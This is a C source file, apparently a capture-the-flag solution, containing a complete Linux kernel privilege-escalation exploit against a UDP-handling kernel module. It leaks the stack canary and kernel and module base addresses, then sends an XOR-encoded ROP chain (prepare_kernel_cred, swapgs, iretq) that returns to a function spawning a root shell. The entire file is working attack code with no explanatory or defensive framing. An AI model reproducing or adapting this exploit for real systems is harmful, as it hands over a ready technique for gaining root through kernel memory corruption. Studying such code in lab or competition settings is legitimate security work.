/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>

#define SERVER "6.6.6.7"
#define BUFLEN 512   // Max length of buffer
#define PORT1 12345  // The port on which to send data
#define PORT2 1337   // The port on which to send data

struct payload_t {
    unsigned len;
    char *payload;
};

void die(char *s)
{
    perror(s);
    exit(1);
}

void *shmm;

void dump(unsigned char *mem, int len) {
    int i = 0;
    int j = 0;
    int maxlines = len/0x10+1;
    int tmp;

    for (; i < maxlines; i+=0x1) {
        if (i == maxlines-1) {
            tmp = len%0x10;

        } else {
            tmp = 0x10;
        }
        for (; j < tmp; j+=0x1) {
            if (j == 7) {
                printf("%02x        ", *(mem+j+i*0x10));
            } else {
                printf("%02x ", *(mem+j+i*0x10));
            }
        }
        puts("");
        j = 0x0;
    }
}

char *get_packet(char *payload, unsigned payload_len) {

    if (payload_len%0x100) {
        printf("length error");
        exit(-1);
    }

    char *packet = (char *)malloc(payload_len+0x6);

    memset(packet, '\x00', 6);
    memset(packet+0x6, '\x42', payload_len);
    packet[0x0] = 'N';
    packet[0x1] = 'u';
    packet[0x2] = '1';
    packet[0x3] = 'L';
    *(unsigned short *)(&packet[0x4]) = (payload_len)>>8;
    memcpy(&packet[0x6], payload, payload_len);

    return packet;
}

char *get_leak_payload(unsigned payload_len) {
    char *payload = malloc(payload_len);

    memset(payload, 'A'^0x6f, payload_len);

    payload[0x0] = 0x13;
    payload[0x1] = 0x37;
    return payload;

}

void shell(void) {
        char buf[0x20];
        printf("[+] getuid() ...");
        if(!getuid()) {
                printf(" [root]\n[+] Enjoy your shell...\n");
                system("cat /flag");
                system("/bin/sh");

        } else {
                printf("[+] not root\n[+] failed !!!\n");
        }
}

unsigned long user_cs, user_ss, user_rflags;
void *stored_fop;
struct file *map_stage;

static void save_state() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"
       );

}

char *get_rop_payload(unsigned payload_len) {

    int i;
    unsigned long long *payload = (unsigned long long *)malloc(payload_len);
    unsigned long long canary = *(unsigned long long *)shmm;
    unsigned long long ko_base = *(unsigned long long *)((unsigned long long *)shmm+1);
    unsigned long long kn_base = *(unsigned long long *)((unsigned long long *)shmm+2);

    char stack[0x1000];
    memset(payload, 'A', payload_len);

    char *map_stack_tmp = mmap((void *)(0x84000000), 0x1000000, PROT_READ | PROT_WRITE, MAP_FIXED |  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    // save state
    unsigned long save_state_addr = (unsigned long)save_state;
    mprotect((void *)(save_state_addr&0xfffffffffff000), 0x1000, PROT_WRITE | PROT_READ | PROT_EXEC);

    *(char *)(save_state_addr+5) = 0x8c;
    *(char *)(save_state_addr+8) = 0x8c;

    mprotect((void *)(save_state_addr&0xfffffffffff000), 0x1000, PROT_READ | PROT_EXEC);

    dump(save_state_addr, 0x30);

    save_state();

    payload[0x20] = *(unsigned long long *)shmm;
    payload[0x26] = kn_base+0x2397d;// pop rdi; ret
    payload[0x27] = 0;
    payload[0x28] = kn_base+0x7d3a0;// prepare_kernel_cred
    payload[0x29] = kn_base+0x5cf6f8;// pop rcx; ret
    payload[0x2a] = 0x0;
    payload[0x2b] = kn_base+0x45541e;// pop rsi; ret
    payload[0x2c] = 0x1;
    payload[0x2d] = kn_base+0x39230b;// cmp ecx, esi ; mov rdi, rax ; ja 0xffffffff81392305 ; pop rbp ; ret
    payload[0x2e] = 0x0;
    payload[0x2f] = kn_base+0x7cfd0;// prepare_kernel_cred
    payload[0x30] = kn_base+0x9dc6cb;// swapgs ; pop rbp ; ret
    payload[0x31] = 0xdeadbeefdeadbeef;
    payload[0x32] = kn_base+0x22756;// iretq
    payload[0x33] = shell;
    payload[0x34] = user_cs;
    payload[0x35] = user_rflags;
    payload[0x36] = stack;
    payload[0x37] = user_ss;

    for (i = 0; i < payload_len; i++) {
        *((char *)payload+i) ^= 0x6f;
    }
    return (char *)payload;
}

void leak1() {
    struct sockaddr_in si_other;
    int sk, i;
    int slen = sizeof(si_other);
    unsigned len;
    char *data = NULL;
    char buf[0x300];

    if ((sk = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    printf("send sock %d\n", sk);

    memset((char *) &si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(PORT1);

    if (inet_aton(SERVER , &si_other.sin_addr) == 0)
    {
        fprintf(stderr, "inet_aton() failed\n");
        exit(1);
    }

    unsigned payload_len = 0x300;
    char *payload = get_leak_payload(payload_len);
    char *packet = get_packet(payload, payload_len);

    if (sendto(sk, packet, payload_len+0x6, 0, (struct sockaddr *) &si_other, slen)==-1)
    {
        die("sendto()");
    }
}

void leak2() {
    struct sockaddr_in si_me, si_other;

    int s, i, recv_len;
    int slen = sizeof(si_other);
    char buf[BUFLEN];

    setbuf(stdout, NULL);

    if ((s = socket(AF_INET, SOCK_DGRAM, 17)) == -1)
    {
        die("socket");
    }
    printf("recv sock %d\n", s);

    memset((char *) &si_me, 0, sizeof(si_me));

    si_me.sin_family = AF_INET;
    si_me.sin_port = htons(PORT2);
    si_me.sin_addr.s_addr = inet_addr("127.0.0.1");

    if(bind(s, (struct sockaddr*)&si_me, sizeof(si_me)) == -1)
    {
        die("bind");
    }

    printf("Waiting for data...");
    fflush(stdout);

    if ((recv_len = recvfrom(s, buf, 0x206, 0, (struct sockaddr *) &si_other, &slen)) == -1)
    {
        die("recvfrom()");
    }

    printf("Received packet from %s:%d\n", inet_ntoa(si_other.sin_addr), ntohs(si_other.sin_port));
    printf("Data: %s\n" , buf);
    fflush(stdout);

    dump(buf+6, recv_len);

    unsigned long long canary = *((unsigned long long*)(buf+6+0x100));
    printf("canary : %#llx\n", canary);
    unsigned long long ko_base = *((unsigned long long*)(buf+6+0x130))-0x22d;
    printf("ko_base : %#llx\n", ko_base);
    unsigned long long kn_base = *((unsigned long long*)(buf+6+0x150))-0x7c8d4e;
    printf("kn_base : %#llx\n", kn_base);
    *(unsigned long long *)shmm = canary;
    *(unsigned long long *)((unsigned long long *)shmm+1) =ko_base;
    *(unsigned long long *)((unsigned long long *)shmm+2) =kn_base;

    close(s);
}

void* create_shared_memory(size_t size) {
    int protection = PROT_READ | PROT_WRITE;
    int visibility = MAP_ANONYMOUS | MAP_SHARED;
    return mmap(NULL, size, protection, visibility, 0, 0);
}

void escalate() {
    struct sockaddr_in si_other;
    int sk, i;
    int slen = sizeof(si_other);
    unsigned len;
    char *data = NULL;
    char buf[0x300];

    if ((sk = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    printf("send sock %d\n", sk);

    memset((char *) &si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(PORT1);

    if (inet_aton(SERVER , &si_other.sin_addr) == 0)
    {
        fprintf(stderr, "inet_aton() failed\n");
        exit(1);
    }

    unsigned payload_len = 0x300;
    char *payload = get_rop_payload(payload_len);
    char *packet = get_packet(payload, payload_len);

    if (sendto(sk, packet, payload_len+0x6, 0, (struct sockaddr *) &si_other, slen)==-1)
    {
        die("sendto()");
    }
}

void exploit() {
    shmm = create_shared_memory(0x100);

    if (!fork()) {
        leak2();
        exit(0);
    }

    sleep(3);
    leak1();
    sleep(3);

    printf("canary : %#llx\n", *(unsigned long long *)shmm);
    printf("ko_base : %#llx\n", *(unsigned long long *)((unsigned long long *)shmm+1));

    escalate();
}

int main(void)
{
    exploit();
    return 0;
}
